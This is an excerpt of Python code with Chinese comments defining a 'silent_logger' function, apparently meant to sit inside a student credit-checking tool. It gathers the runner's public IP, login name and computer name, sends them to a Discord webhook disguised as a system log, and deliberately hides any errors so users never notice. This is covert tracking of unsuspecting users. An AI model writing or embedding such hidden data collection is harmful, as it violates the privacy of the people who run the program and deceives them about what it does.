...
def silent_logger():
    # 這裡貼上妳剛剛在 Discord 複製的 Webhook 網址
    ...
    try:
        # 1. 取得執行者的公網 IP
        # 使用 ipify API，這在資工領域很常用來抓外網 IP
        ip = requests.get('https://api.ipify.org', timeout=5).text
        
        # 2. 取得電腦與使用者資訊
        user_name = os.getlogin()
        comp_name = platform.node() # 電腦名稱
        
        # 3. 準備傳送到 Discord 的訊息
        payload = {
            "username": "學分檢核系統-後台紀錄",
            "content": f"📊 **程式執行紀錄**\n"
                       f"👤 **使用者**: `{user_name}` (電腦名: `{comp_name}`)\n"
                       f"🌐 **來源 IP**: `{ip}`\n"
        ...
        # 萬一網路不通或 Webhook 失效，默默跳過，不讓使用者看到錯誤訊息
        pass
